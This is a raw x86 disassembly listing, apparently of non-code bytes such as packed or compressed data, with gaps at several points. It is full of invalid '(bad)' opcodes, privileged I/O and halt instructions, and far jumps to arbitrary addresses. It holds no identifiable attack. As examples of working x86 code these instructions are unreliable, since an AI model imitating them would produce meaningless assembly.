  4291e6:	sub    DWORD PTR [edi+0x3a7f1a92],esp
  4291ec:	pushf  
  4291ed:	adc    eax,0x6fdce62e
  4291f2:	ja     0x4291e0
  4291f4:	mov    dl,0x81
  4291f6:	aas    
  4291f7:	fild   DWORD PTR [ebx-0x6b]
  4291fa:	das    
  4291fb:	push   es
  4291fc:	je     0x429278
  4291fe:	ror    DWORD PTR [eax-0x54],0x50
  429202:	mov    esi,0xa05922ba
  429207:	jle    0x4291c8
  429209:	dec    esi
  42920a:	inc    esi
  42920b:	mov    ecx,DWORD PTR [esi]
  42920d:	cs mov cl,0xaa
  429210:	int    0x47
  429212:	or     edx,DWORD PTR [ebx-0xfdbd806]
  429218:	aad    0x2e
  42921a:	inc    ebp
  42921b:	pop    edi
  42921c:	adc    esp,edi
  42921e:	in     eax,0xbf
  429220:	add    DWORD PTR [ecx+0x6a],ecx
  429223:	pop    es
  429224:	lock hlt 
  429226:	jae    0x4291da
  429228:	js     0x4292a1
  42922a:	hlt    
  42922b:	sub    al,0xc4
  42922d:	in     al,dx
  42922e:	mov    al,0xb9
  429230:	ret    0xc6a1
  429233:	retf   
  429234:	popf   
  429235:	sub    cl,cl
  429237:	sahf   
  429238:	cdq    
  429239:	or     al,0xb0
  42923b:	ins    DWORD PTR es:[edi],dx
  42923c:	add    eax,0x24f981cc
  429241:	xor    ch,bh
  429243:	push   cs
  429244:	je     0x429271
  429246:	mul    DWORD PTR [edi-0x3f6be822]
  42924c:	fnstsw WORD PTR [ebp+0x7e]
  42924f:	cdq    
  429250:	mov    ch,0x14
  429252:	sbb    DWORD PTR [esi-0x55422ecf],esp
  429258:	jp     0x429231
  42925a:	lods   al,BYTE PTR ds:[esi]
  42925b:	adc    cl,BYTE PTR [edx+0x62]
  42925e:	jmp    0x8e64a7e8
  429263:	mov    DWORD PTR [edx-0x5c64990e],edi
  429269:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42926a:	push   ecx
  42926b:	mov    bl,0x96
  42926d:	out    0x9c,eax
  42926f:	and    ch,BYTE PTR [esi-0x34]
  429272:	mov    ebp,0x82d546fb
  429277:	mov    eax,0x26744907
  42927c:	dec    esp
  42927d:	call   0x8146:0xdd90ba2d
  429284:	jmp    0xa3ed9ba1
  429289:	popa   
  42928a:	(bad)  
  42928b:	sbb    eax,eax
  42928d:	cmp    bl,BYTE PTR [edx]
  42928f:	repnz mov ecx,0x47943f12
  429295:	add    eax,DWORD PTR [ebx-0xab5508d]
  42929b:	sub    edx,DWORD PTR [esi-0x6aa50ac1]
  4292a1:	dec    eax
  4292a2:	(bad)  
  4292a3:	jb     0x4292d7
  4292a5:	jecxz  0x4292a3
  4292a7:	jmp    0xad86:0x989a61f9
  4292ae:	mov    ds:0x1a911801,eax
  4292b3:	pushf  
  4292b4:	sbb    al,0x0
	...
  429316:	lock adc al,0xe1
  429319:	(bad)  
  42931a:	in     eax,0xff
  42931c:	call   FWORD PTR [esi]
  42931e:	xor    cl,BYTE PTR [ebx-0xc]
  429321:	fs adc eax,0x22815117
  429327:	mov    eax,0x1070001
  42932c:	add    BYTE PTR [eax],al
  42932e:	xchg   ebx,eax
  42932f:	xchg   ebp,eax
  429330:	xor    esi,DWORD PTR [ecx]
  429332:	data16 loopne 0x429390
  429335:	imul   ebx,DWORD PTR [esp+ebx*2+0x29],0x9f6224f8
  42933d:	fscale 
  42933f:	add    DWORD PTR [esi-0x7cd8d959],ebp
  429345:	ret    
  429346:	cmp    al,0x96
  429348:	cmp    esp,0x3b
  42934b:	enter  0x6e40,0xc8
  42934f:	jl     0x429313
  429351:	fidiv  DWORD PTR [edx-0x22]
  429354:	mov    eax,ds:0x5de25182
  429359:	mov    WORD PTR [ebp+0x7d0d138e],ds
  42935f:	sub    DWORD PTR [eax-0x53a939d3],ebp
  429365:	icebp  
  429366:	mov    ebx,0x4a696433
  42936b:	nop
  42936c:	or     al,0x27
  42936e:	(bad)  
  429370:	(bad)  
  429371:	push   ss
  429372:	out    dx,al
  429373:	in     al,dx
  429374:	cmp    bh,BYTE PTR [eax+0x39487738]
  42937a:	icebp  
  42937b:	(bad)  [edx]
  42937d:	sub    eax,0x725ab1bc
  429382:	lods   eax,DWORD PTR ds:[esi]
  429383:	shl    BYTE PTR [edi+0x3f],1
  429386:	aad    0xf6
  429388:	mov    bl,BYTE PTR [edx+0x5d2364f4]
  42938e:	push   edx
  42938f:	dec    ecx
  429390:	test   eax,0xf647608
  429395:	jnp    0x4293db
  429397:	adc    eax,0x2ddcd2db
  42939c:	pop    esi
  42939d:	mov    esi,0x6887236c
  4293a2:	mov    eax,ds:0x280adcf3
  4293a7:	arpl   WORD PTR [ebx],bp
  4293a9:	push   edi
  4293aa:	add    BYTE PTR [esi-0x2db4e649],bl
  4293b0:	sub    eax,0xde987980
  4293b5:	fldenv [ecx]
  4293b7:	lahf   
  4293b8:	push   0xffffffce
  4293ba:	bound  edx,QWORD PTR [edx]
  4293bc:	jns    0x42939b
  4293be:	jne    0x4293d2
  4293c0:	test   BYTE PTR [edx],dh
  4293c2:	or     ebx,DWORD PTR ds:0x1f081abf
  4293c8:	cmp    DWORD PTR [ecx],ebx
  4293ca:	retf   0x50cc
  4293cd:	out    dx,al
  4293ce:	xchg   edx,eax
  4293cf:	add    BYTE PTR [edi+0x3b],0xdb
  4293d3:	cmp    edi,esp
  4293d5:	sbb    dh,BYTE PTR [esi-0x703951ff]
  4293db:	mov    al,ds:0xad57ae27
  4293e0:	adc    eax,0x35f1b945
  4293e5:	jo     0x4293bc
  4293e7:	jns    0x4293a5
  4293e9:	mov    ebx,0x2ea24403
  4293ee:	add    edx,0xffffffa5
  4293f1:	and    cl,bh
  4293f3:	or     eax,0x39c3344a
  4293f8:	in     al,0x35
  4293fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4293fb:	inc    ebx
  4293fc:	sbb    esi,esi
  4293fe:	mov    al,0x3a
  429400:	ins    DWORD PTR es:[edi],dx
  429401:	shr    BYTE PTR [eax-0xc],1
  429404:	cwde   
  429405:	leave  
  429406:	push   0xc2600f9a
  42940b:	and    al,0x79
  42940d:	ins    BYTE PTR es:[edi],dx
  42940e:	jle    0x429416
  429410:	add    eax,0x8654cc86
  429415:	or     ch,BYTE PTR ds:0x882e257a
  42941b:	jp     0x4293c4
  42941d:	ret    0xfef
  429420:	aas    
  429421:	(bad)  
  429422:	fsub   st,st(2)
  429424:	dec    ebx
  429425:	inc    edx
  429426:	dec    BYTE PTR [ecx+0x1f]
  429429:	add    edi,DWORD PTR cs:[ebx+0xa]
  42942d:	mov    edi,0xdea9a403
  429432:	out    dx,al
  429433:	test   eax,0x71
	...
  429494:	add    BYTE PTR [eax],al
  429496:	dec    esp
  429497:	or     eax,0x3e532c13
  42949c:	jg     0x42950b
  42949e:	adc    al,0xa9
  4294a0:	outs   dx,DWORD PTR ds:[esi]
  4294a1:	xlat   BYTE PTR ds:[ebx]
  4294a2:	sahf   
  4294a3:	in     al,dx
  4294a4:	sub    BYTE PTR [eax],dh
  4294a6:	sub    DWORD PTR [ecx+0x1070001],edi
  4294ac:	add    BYTE PTR [eax],al
  4294ae:	push   edi
  4294af:	in     eax,0x45
  4294b1:	mov    ch,BYTE PTR [esi-0x72]
  4294b4:	stc    
  4294b5:	imul   ecx,DWORD PTR [edx],0x6c
  4294b8:	sahf   
  4294b9:	add    DWORD PTR [ecx+ebp*8-0x7],eax
  4294bd:	xchg   ebx,eax
  4294be:	jp     0x42947d
  4294c0:	mov    ds:0x5099f732,al
  4294c5:	add    DWORD PTR [esi+ebx*8-0x21d0cd7d],edx
  4294cc:	xor    eax,DWORD PTR [edi+0x1d]
  4294cf:	push   eax
  4294d0:	fldenv [ecx-0x22]
  4294d3:	clc    
  4294d4:	fisubr DWORD PTR [ebp-0x10]
  4294d7:	or     BYTE PTR [ecx+0x25668cc4],ah
  4294dd:	outs   dx,BYTE PTR ds:[esi]
  4294de:	push   edi
  4294df:	iret   
  4294e0:	pop    esi
  4294e1:	jge    0x4294da
  4294e3:	(bad)  
  4294e5:	sub    al,0x80
  4294e7:	push   es
  4294e8:	cmp    ebp,ebx
  4294ea:	aaa    
  4294eb:	pop    ds
  4294ec:	hlt    
  4294ed:	pop    ebx
  4294ee:	fsub   DWORD PTR [edi+0x4c]
  4294f1:	cmp    dh,al
  4294f3:	(bad)  
  4294f4:	xchg   ebx,eax
  4294f5:	call   0x75f3:0x96d2fa32
  4294fc:	hlt    
  4294fd:	ins    BYTE PTR es:[edi],dx
  4294fe:	pop    es
  4294ff:	jecxz  0x429562
  429501:	mov    al,ds:0xe74c25c3
  429506:	gs clc 
  429508:	push   ebp
  429509:	xor    esi,DWORD PTR [eax+esi*1-0x33]
  42950d:	pusha  
  42950e:	in     al,0xc4
  429510:	fucom  st(0)
  429512:	and    ch,ah
  429514:	add    DWORD PTR [ebx],eax
  429516:	xchg   esi,eax
  429517:	je     0x4294ac
  429519:	and    eax,edx
  42951b:	imul   ecx,DWORD PTR [ebx-0x1b],0xffffffb0
  42951f:	lock in eax,0x94
  429522:	fmul   st(0),st
  429524:	rcl    BYTE PTR [edx],cl
  429526:	ret    
  429527:	push   ds
  429528:	scas   al,BYTE PTR es:[edi]
  429529:	dec    edx
  42952a:	lods   al,BYTE PTR ds:[esi]
  42952b:	popa   
  42952c:	mov    dl,0x1b
  42952e:	idiv   edi
  429530:	add    eax,0xbd547915
  429535:	jge    0x42950d
  429537:	into   
  429538:	xor    DWORD PTR [esi+0x645565a2],edi
  42953e:	adc    dh,bh
  429540:	sbb    ecx,ebx
  429542:	or     al,0xcd
  429544:	mov    bh,0xaa
  429546:	addr16 pop esi
  429548:	add    DWORD PTR [esp+edi*1],ebx
  42954b:	fisubr DWORD PTR [esi-0x6ff488c2]
  429551:	pop    ebx
  429552:	ins    DWORD PTR es:[edi],dx
  429553:	or     cl,ch
  429555:	lds    ebp,FWORD PTR ds:0x369d5ae1
  42955b:	sub    bh,al
  42955d:	ds push ecx
  42955f:	int    0x14
  429561:	in     eax,dx
  429562:	push   esi
  429563:	aad    0x99
  429565:	jne    0x42952a
  429567:	in     al,dx
  429568:	dec    ebx
  429569:	mov    ebp,0xf7cb0d6f
  42956e:	mov    esp,DWORD PTR [esi-0x43]
  429571:	add    DWORD PTR [esi+esi*1],ebx
  429574:	push   esi
  429575:	xchg   ebx,eax
  429576:	adc    bl,BYTE PTR [ebx]
  429578:	enter  0x9ffa,0xd2
  42957c:	mov    al,0x8f
  42957e:	rcr    ah,1
  429580:	dec    esi
  429581:	or     BYTE PTR [ecx+ecx*8+0x3d],dl
  429585:	(bad)  
  429586:	test   eax,0xac3a1a08
  42958b:	jp     0x7a5e63b0
  429591:	push   cs
  429592:	sub    dh,BYTE PTR [edx+edi*1]
  429595:	mov    ah,bl
  429597:	dec    edx
  429598:	icebp  
  429599:	hlt    
  42959a:	arpl   WORD PTR [esi-0x53],dx
  42959d:	in     al,dx
  42959e:	sbb    eax,0x9145963
  4295a3:	add    BYTE PTR [edx-0x59337b1c],dl
  4295a9:	or     DWORD PTR [eax+edi*8+0x52442b34],0xffffff8a
  4295b1:	jmp    0x105b96c
	...
  429616:	ins    DWORD PTR es:[edi],dx
  429617:	sbb    eax,0xfbf6c0e6
  42961c:	outs   dx,DWORD PTR ds:[esi]
  42961d:	mov    ebp,0x8523ba9d
  429622:	push   0xffffffe5
  429624:	or     DWORD PTR [esi+0x30],0x70001ba
  42962b:	add    DWORD PTR [eax],eax
  42962d:	add    BYTE PTR [eax],al
  42962f:	and    BYTE PTR [edi],0xc8
  429632:	jnp    0x4296ad
  429634:	fisub  DWORD PTR [ecx-0x4be60b22]
  42963a:	inc    eax
  42963b:	dec    DWORD PTR [ebx+0x51a09b]
  429641:	inc    edx
  429642:	cdq    
  429643:	xchg   edx,eax
  429644:	dec    ecx
  429645:	add    BYTE PTR [ecx-0x2b],cl
  429648:	js     0x429696
  42964a:	cmp    al,0x78
  42964c:	fwait
  42964d:	addr16 inc esp
  42964f:	mov    al,0x9b
  429651:	iret   
  429652:	jecxz  0x42964a
  429654:	mov    dh,0x9d
  429656:	mov    ds:0xec6c6412,eax
  42965b:	fwait
  42965c:	inc    bp
  42965e:	add    dl,BYTE PTR [eax]
  429660:	(bad)  
  429661:	mov    ah,0x6a
  429663:	pushf  
  429664:	into   
  429665:	jmp    0x8e937d3b
  42966a:	out    dx,al
  42966b:	lock add edi,DWORD PTR [eax]
  42966e:	nop
  42966f:	add    BYTE PTR [eax],ah
  429671:	xor    eax,0x64e133eb
  429676:	xor    eax,0xb6878e4c
  42967b:	sahf   
  42967c:	inc    ebx
  42967d:	daa    
  42967e:	xor    ch,bh
  429680:	xor    eax,0x19bb59b7
  429685:	sub    DWORD PTR [ebx+0x78],eax
  429688:	lods   al,BYTE PTR ds:[esi]
  429689:	lea    esi,[ebp+0x6808c13c]
  42968f:	sbb    DWORD PTR [edx+0x16],ecx
  429692:	sub    ch,dh
  429694:	lea    ebx,[ecx]
  429696:	xchg   DWORD PTR [eax+ecx*2],edx
  429699:	mov    dl,0x38
  42969b:	or     bl,BYTE PTR [ecx-0x28]
  42969e:	das    
  42969f:	adc    DWORD PTR [ecx+0x38],edi
  4296a2:	cdq    
  4296a3:	call   0x968a:0x7bad1e4d
  4296aa:	call   FWORD PTR [ebx]
  4296ac:	and    edi,DWORD PTR [edx+ecx*2-0x34577f9e]
  4296b3:	xor    cl,ah
  4296b5:	or     esp,edi
  4296b7:	push   es
  4296b8:	adc    DWORD PTR [eax+0x20ff845c],ecx
  4296be:	(bad)  
  4296bf:	pop    ebp
  4296c0:	in     eax,0x38
  4296c2:	sbb    al,0x6a
  4296c4:	(bad)  
  4296c5:	or     eax,0x99dbf945
  4296ca:	ss aaa 
  4296cc:	loope  0x42971a
  4296ce:	sub    ah,BYTE PTR [edi]
  4296d0:	leave  
  4296d1:	jnp    0x429709
  4296d3:	cmp    ebp,DWORD PTR [eax]
  4296d5:	pop    esi
  4296d6:	cmp    al,0x9c
  4296d8:	in     al,0x84
  4296da:	lea    edi,[edx+edi*1-0x46950b58]
  4296e1:	xchg   BYTE PTR [ebx-0x4],ch
  4296e4:	cmp    eax,0x8c51aa77
  4296e9:	jns    0x429723
  4296eb:	cmp    bh,ah
  4296ed:	popa   
  4296ee:	hlt    
  4296ef:	dec    ecx
  4296f0:	pop    ebp
  4296f1:	dec    esp
  4296f2:	dec    eax
  4296f3:	or     eax,0xc27c74f5
  4296f8:	(bad)  
  4296f9:	pop    ecx
  4296fa:	jne    0x4296d6
  4296fc:	sub    bh,bl
  4296fe:	pop    esp
  4296ff:	push   esp
  429700:	and    al,ch
  429702:	imul   eax,DWORD PTR ds:0x7eaea471,0x37adc769
  42970c:	ss iret 
  42970e:	mov    edi,0xa9c4d8bb
  429713:	xor    BYTE PTR [esi+0x3b],cl
  429716:	scas   al,BYTE PTR es:[edi]
  429717:	ja     0x429727
  429719:	in     eax,dx
  42971a:	push   es
  42971b:	pop    ecx
  42971c:	not    DWORD PTR [edi-0x46611eb5]
  429722:	hlt    
  429723:	mov    DWORD PTR [edi+ebx*1+0x6e],ebp
  429727:	test   eax,0xfd735089
  42972c:	test   BYTE PTR [eax],0xae
  42972f:	jnp    0x429758
  429731:	icebp  
  429732:	inc    ebp
  429733:	add    DWORD PTR [edi],edi
	...
  429795:	add    BYTE PTR [eax],dh
  429797:	inc    edx
  429798:	fbld   TBYTE PTR [edx-0x1]
  42979b:	(bad)  
  42979c:	mov    ebp,0x1396252
  4297a1:	lar    edi,WORD PTR [ebx+0x44]
  4297a5:	xchg   BYTE PTR [edi],dh
  4297a7:	mov    ebx,0x1070001
  4297ac:	add    BYTE PTR [eax],al
  4297ae:	mov    ch,0x9b
  4297b0:	push   edi
  4297b1:	jl     0x4297d4
  4297b3:	mov    edx,0xf9e689
  4297b8:	nop
  4297b9:	stc    
  4297ba:	data16 cld 
  4297bc:	mov    esi,0x88155c1b
  4297c1:	out    dx,eax
  4297c2:	call   0xc11f:0x5425d15c
  4297c9:	test   BYTE PTR [ebx+0x2b],0x45
  4297cd:	in     eax,dx
  4297ce:	cmp    edi,eax
  4297d0:	inc    edi
  4297d1:	sub    ah,BYTE PTR [ebp-0x34]
  4297d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4297d5:	icebp  
  4297d6:	jns    0x4297d1
  4297d8:	daa    
  4297d9:	pop    edx
  4297da:	out    0x3e,eax
  4297dc:	push   0xe7be7f9d
  4297e1:	das    
  4297e2:	dec    esi
  4297e3:	daa    
  4297e4:	sbb    al,0x48
  4297e6:	cwde   
  4297e7:	fdivr  QWORD PTR ds:0x63ab5151
  4297ed:	jecxz  0x429856
  4297ef:	outs   dx,BYTE PTR ds:[esi]
  4297f0:	gs mov ebx,0x593e3dbb
  4297f6:	cld    
  4297f7:	pop    edx
  4297f8:	adc    al,0x1c
  4297fa:	ficom  DWORD PTR [edi-0x38e6ba20]
  429800:	clc    
  429801:	dec    esi
  429802:	nop
  429803:	shl    DWORD PTR [edi-0x71],cl
  429806:	push   es
  429807:	xchg   ebp,eax
  429808:	(bad)  
  429809:	and    al,0x0
  42980b:	xlat   BYTE PTR ds:[ebx]
  42980c:	push   0xffffffc0
  42980e:	lods   eax,DWORD PTR ds:[esi]
  42980f:	dec    esp
  429810:	add    dl,bh
  429812:	jo     0x429884
  429814:	addr16 mov ds:0x5e05,al
  429818:	daa    
  429819:	adc    DWORD PTR [ecx],ecx
  42981b:	push   edx
  42981c:	push   esp
  42981d:	loopne 0x429825
  42981f:	arpl   si,ax
  429821:	not    DWORD PTR [edi]
  429823:	outs   dx,DWORD PTR ds:[esi]
  429824:	js     0x4297d6
  429826:	mov    ebx,0xbde55947
  42982b:	sbb    eax,0x50a697d0
  429830:	nop
  429831:	sti    
  429832:	(bad)  
  429833:	mov    BYTE PTR ds:0xf1f8372c,dl
  429839:	test   al,0xfc
  42983b:	(bad)  
  42983c:	test   cl,ah
  42983e:	retf   
  42983f:	sub    dh,BYTE PTR [eax+0x39e0a57d]
  429845:	xchg   BYTE PTR [ebx+0xe],cl
  429848:	jne    0x4298ac
  42984a:	call   0x6fc47582
  42984f:	ret    0xddfc
  429852:	inc    esi
  429853:	jp     0x4297e1
  429855:	mov    eax,edx
  429857:	sbb    edi,DWORD PTR [ebx]
  429859:	mov    al,ds:0x57e7dddd
  42985e:	dec    edx
  42985f:	mov    DWORD PTR [edi+edx*4+0x17d26304],esp
  429866:	fld    DWORD PTR [edx+0x1786bdd7]
  42986c:	cmp    ecx,ebp
  42986e:	jmp    0x335a3bb3
  429873:	shl    BYTE PTR [esi-0x5a],cl
  429876:	and    ecx,edx
  429878:	pop    edx
  429879:	call   DWORD PTR [eax+0x701ab4ba]
  42987f:	int3   
  429880:	mov    ebx,edx
  429882:	fwait
  429883:	repz int3 
  429885:	sub    BYTE PTR [ebp+ecx*1-0x57],ah
  429889:	add    BYTE PTR [ecx],al
  42988b:	test   DWORD PTR [edi+0xb4c8852],ebx
  429891:	enter  0x1837,0x8c
  429895:	dec    ecx
  429896:	pop    ebx
  429897:	inc    esp
  429898:	mov    esi,0xbe8659f6
  42989d:	push   eax
  42989e:	(bad)  
  42989f:	inc    edx
  4298a1:	retf   
  4298a2:	test   eax,0xabf54c76
  4298a7:	(bad)  
  4298a9:	pusha  
  4298aa:	inc    edi
  4298ab:	shl    DWORD PTR [eax],cl
  4298ad:	mov    DWORD PTR [edx],eax
  4298af:	push   ds
  4298b0:	push   esp
  4298b1:	inc    esp
  4298b2:	sar    ebp,cl
  4298b4:	dec    esi
	...
  429915:	add    BYTE PTR [edi+0x68],dl
  429918:	fistp  QWORD PTR fs:[edi-0x21]
  42991c:	(bad)  
  42991d:	call   0x449747d3
  429922:	fstp   QWORD PTR [eax-0x43c10751]
  429928:	add    DWORD PTR [eax],eax
  42992a:	pop    es
  42992b:	add    DWORD PTR [eax],eax
  42992d:	add    BYTE PTR [edi-0x74f4dc4],cl
  429933:	shr    DWORD PTR [esi-0x33dfdd52],1
  429939:	cld    
  42993a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42993b:	and    eax,0xdb44c518
  429940:	push   ecx
  429941:	mov    dh,0x61
  429943:	ins    DWORD PTR es:[edi],dx
  429944:	fst    QWORD PTR [edi-0x756fd2d0]
  42994a:	inc    edx
  42994b:	rol    BYTE PTR ds:0x7a3a0e43,1
  429951:	jns    0x4298fa
  429953:	jecxz  0x4299a6
  429955:	outs   dx,BYTE PTR ds:[esi]
  429956:	xor    eax,0xec4cc265
  42995b:	in     al,dx
  42995c:	je     0x42999c
  42995e:	xchg   ebp,eax
  42995f:	into   
  429960:	ins    BYTE PTR es:[edi],dx
  429961:	imul   ebx,ecx,0xfed7e568
  429967:	dec    ebp
  429968:	fs loope 0x42997a
  42996b:	inc    esp
  42996c:	jp     0x429982
  42996e:	xchg   edx,eax
  42996f:	dec    esp
  429970:	pop    eax
  429971:	xor    cl,BYTE PTR [ecx]
  429973:	xor    BYTE PTR [edx],bl
  429975:	push   edi
  429976:	jl     0x42991a
  429978:	inc    ebx
  429979:	push   edi
  42997a:	pop    eax
  42997b:	cld    
  42997c:	xchg   DWORD PTR [eax],esp
  42997e:	fwait
  42997f:	push   ecx
  429980:	sbb    al,0x47
  429982:	and    eax,0x88258606
  429987:	xchg   esp,eax
  429988:	lahf   
  429989:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42998a:	mov    ds:0x15b00531,al
  42998f:	nop
  429990:	enter  0x1185,0x6c
  429994:	xchg   edx,eax
  429995:	pushf  
  429996:	(bad)  
  429998:	pop    ebx
  429999:	sub    al,0xaf
  42999b:	inc    ebp
  42999c:	jmp    0x7e6d:0x5a653924
  4299a3:	lahf   
  4299a4:	inc    ecx
  4299a5:	mov    bh,0x58
  4299a7:	jmp    0xf66508ba
  4299ac:	inc    ebp
  4299ad:	xchg   ebp,eax
  4299ae:	pop    eax
  4299af:	jecxz  0x42999b
  4299b1:	data16 mov ch,0x33
  4299b4:	sub    edx,DWORD PTR [edx-0x394dab7b]
  4299ba:	mov    ?,WORD PTR [edi]
  4299bc:	pusha  
  4299bd:	mov    al,0x3e
  4299bf:	ins    BYTE PTR es:[edi],dx
  4299c0:	in     al,dx
  4299c1:	push   ds
  4299c2:	add    bl,bh
  4299c4:	pushf  
  4299c5:	enter  0x7947,0x1f
  4299c9:	imul   ebx,DWORD PTR [eax],0xfffffffb
  4299cc:	push   ebx
  4299cd:	pop    ebp
  4299ce:	inc    edx
  4299cf:	mov    cl,0xed
  4299d1:	aam    0xf6
  4299d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4299d4:	bound  esp,QWORD PTR [edi+0x7d90d9cc]
  4299da:	adc    al,0x97
  4299dc:	mov    bh,0x5
  4299de:	adc    ch,BYTE PTR [ebx+0x8]
  4299e1:	repnz cmc 
  4299e3:	xor    eax,esp
  4299e5:	daa    
  4299e6:	test   BYTE PTR [ecx-0x6a43599f],bl
  4299ec:	dec    ecx
  4299ed:	xchg   edi,eax
  4299ee:	push   edi
  4299ef:	cmp    DWORD PTR [ebx+0x7911f057],esi
  4299f5:	sbb    eax,esi
  4299f7:	or     eax,0x6aadcd0d
  4299fc:	push   es
  4299fd:	cli    
  4299fe:	and    eax,0x4b4262e6
  429a03:	mov    ch,0x8f
  429a05:	or     BYTE PTR [edx-0x3c],bl
  429a08:	test   al,0x76
  429a0a:	cdq    
  429a0b:	xor    eax,0x6155f69a
  429a10:	dec    edx
  429a11:	adc    BYTE PTR [edi+0x73],dl
  429a14:	mov    DWORD PTR [esi-0x64386a64],esp
  429a1a:	mov    cl,0x7f
  429a1c:	add    DWORD PTR [eax],ebp
  429a1e:	or     al,0x7
  429a20:	mov    bh,0xf8
  429a22:	outs   dx,BYTE PTR ds:[esi]
  429a23:	push   0x954c0af0
  429a28:	cmc    
  429a29:	jge    0x429a52
  429a2b:	xlat   BYTE PTR ds:[ebx]
  429a2c:	mov    al,0x35
  429a2e:	or     DWORD PTR [esp+esi*2],esi
  429a31:	mov    BYTE PTR [esi+0xe008],dh
	...
  429a93:	add    BYTE PTR [eax],al
  429a95:	add    dh,cl
  429a97:	std    
  429a98:	sti    
  429a99:	leave  
  429a9a:	sti    
  429a9b:	iret   
  429a9c:	(bad)  
  429a9d:	jmp    DWORD PTR [ecx]
  429a9f:	dec    eax
  429aa0:	mov    edi,0xea39b113
  429aa5:	jg     0x429aec
  429aa7:	mov    ebp,0x1070001
  429aac:	add    BYTE PTR [eax],al
  429aae:	mov    DWORD PTR [esi],edi
  429ab0:	cs ins DWORD PTR es:[edi],dx
  429ab2:	sbb    BYTE PTR ds:0x6329d16f,bh
  429ab8:	push   DWORD PTR [esi-0x31]
  429abb:	lock mov al,ds:0x39e630a8
  429ac1:	pop    esp
  429ac2:	les    ecx,FWORD PTR [esp+eax*1-0x57fdd696]
  429ac9:	aaa    
  429aca:	in     eax,0x36
  429acc:	jg     0x429ae9
  429ace:	outs   dx,BYTE PTR ds:[esi]
  429acf:	mov    es,WORD PTR [edi*2+0x74a881bb]
  429ad6:	sub    DWORD PTR [edx],0xb2be2308
  429adc:	pop    edi
  429add:	mov    al,0x68
  429adf:	or     dl,BYTE PTR [ecx+0x7d104045]
  429ae5:	mov    edi,esp
  429ae7:	popa   
  429ae8:	gs out 0x33,al
  429aeb:	push   ds
  429aec:	inc    ecx
  429aed:	stc    
  429aee:	jge    0x429b66
  429af0:	test   BYTE PTR [edi+esi*2-0x6481e413],cl
  429af7:	pop    edi
  429af8:	xor    dl,BYTE PTR [ebp+0x482782ff]
  429afe:	sbb    dl,BYTE PTR [esi]
  429b00:	sub    BYTE PTR [edi-0xcf5bd49],bl
  429b06:	dec    edx
  429b07:	pop    ecx
  429b08:	mov    ds:0xbd647297,al
  429b0d:	outs   dx,BYTE PTR ds:[esi]
  429b0e:	add    ah,BYTE PTR [edx-0x7aeee255]
  429b14:	mov    bh,0x8b
  429b16:	and    al,0x55
  429b18:	mov    eax,0xd46075b2
  429b1d:	faddp  st(7),st
  429b1f:	lods   eax,DWORD PTR ds:[esi]
  429b20:	inc    esi
  429b21:	mul    DWORD PTR [eax]
  429b23:	scas   eax,DWORD PTR es:[edi]
  429b24:	jae    0x429b28
  429b26:	rcr    BYTE PTR [edx],cl
  429b28:	add    eax,DWORD PTR [ecx+0x1de8c05]
  429b2e:	push   ebx
  429b2f:	aas    
  429b30:	xchg   edi,eax
  429b31:	ds pop ebx
  429b33:	push   ebx
  429b34:	adc    DWORD PTR [eax-0x68],eax
  429b37:	mov    bh,0x20
  429b39:	(bad)  
  429b3a:	and    BYTE PTR [esi],al
  429b3c:	jae    0x429b35
  429b3e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429b3f:	dec    eax
  429b40:	mov    WORD PTR [eax-0x544dc075],ss
  429b46:	or     DWORD PTR cs:[eax+0x51],ebp
  429b4a:	hlt    
  429b4b:	pop    es
  429b4c:	push   ds
  429b4d:	xor    al,0x65
  429b4f:	ret    
  429b50:	push   eax
  429b51:	pop    esp
  429b52:	cdq    
  429b53:	jp     0x429b44
  429b55:	xor    DWORD PTR [edx],edi
  429b57:	outs   dx,BYTE PTR ds:[esi]
  429b58:	test   BYTE PTR [edx],cl
  429b5a:	dec    esi
  429b5b:	adc    cl,ah
  429b5d:	xor    al,0x92
  429b5f:	push   ds
  429b60:	sbb    DWORD PTR [ecx+0x252f9c98],ecx
  429b66:	imul   ebp,DWORD PTR [ecx-0x62a9ec8d],0x49
  429b6d:	fldcw  WORD PTR [ecx+ebx*2+0x257dfcaa]
  429b74:	and    ecx,ebp
  429b76:	int    0x2b
  429b78:	sar    DWORD PTR [ebx+0x1fef308b],0x13
  429b7f:	(bad)  
  429b81:	arpl   bp,ax
  429b83:	repz xchg esi,eax
  429b85:	add    DWORD PTR [edx-0x65578e1b],eax
  429b8b:	jecxz  0x429b1d
  429b8d:	inc    edx
  429b8e:	(bad)  
  429b8f:	nop
  429b90:	aas    
  429b91:	xor    eax,DWORD PTR [esi]
  429b93:	cwde   
  429b94:	sbb    DWORD PTR [eax+0x52db2fe4],ecx
  429b9a:	xor    eax,0xdbceb11c
  429b9f:	stos   DWORD PTR es:[edi],eax
  429ba0:	add    BYTE PTR [ebx],ch
  429ba2:	shl    BYTE PTR [ecx+eiz*2-0x22],cl
  429ba6:	mov    esp,0x91ea85b3
  429bab:	cld    
  429bac:	xor    ch,BYTE PTR ds:0x7ade9be5
  429bb2:	or     al,0x66
  429bb4:	repnz add BYTE PTR [eax],al
	...
  429c13:	add    BYTE PTR [eax],al
  429c15:	add    BYTE PTR [ebx-0x487759ea],ah
  429c1b:	mov    eax,0x52a3faf
  429c20:	xchg   esp,eax
  429c21:	pop    eax
  429c22:	mov    esp,0x4c37891c
  429c27:	mov    esi,0x1070001
  429c2c:	add    BYTE PTR [eax],al
  429c2e:	(bad)  
  429c2f:	fcomp  QWORD PTR [esi-0x45]
  429c32:	test   eax,0xe5354542
  429c37:	or     ebx,DWORD PTR [esi+0x69]
  429c3a:	xchg   edi,eax
  429c3b:	dec    esi
  429c3c:	js     0x429bd8
  429c3e:	push   eax
  429c3f:	outs   dx,DWORD PTR ds:[esi]
  429c40:	(bad)  
  429c41:	out    dx,eax
  429c42:	cmp    bh,dh
  429c44:	jne    0x429c6c
  429c46:	arpl   WORD PTR [esi-0x5d],si
  429c49:	mov    esi,ecx
  429c4b:	scas   eax,DWORD PTR es:[edi]
  429c4c:	xchg   edi,eax
  429c4d:	push   ss
  429c4e:	jb     0x429c0d
  429c50:	pop    eax
  429c51:	add    DWORD PTR [esi+esi*8-0x6f0e7f7f],ecx
